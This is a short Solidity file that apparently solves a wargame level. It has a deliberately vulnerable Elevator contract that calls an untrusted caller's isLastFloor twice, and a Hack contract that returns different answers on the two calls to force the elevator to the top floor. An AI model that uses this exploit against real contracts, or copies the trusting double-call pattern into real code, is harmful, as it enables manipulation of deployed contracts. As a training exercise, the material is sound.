// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Hack {
    Elevator public elevator;

    constructor(address _target) {
        elevator = Elevator(_target);
    }

    bool isSecondTimeCall;

    function isLastFloor(uint) external returns (bool) {
        if (isSecondTimeCall) {
            return true;
        }
        isSecondTimeCall = true;
        return false;
    }

    function attack() public {
        elevator.goTo(99);
    }
}
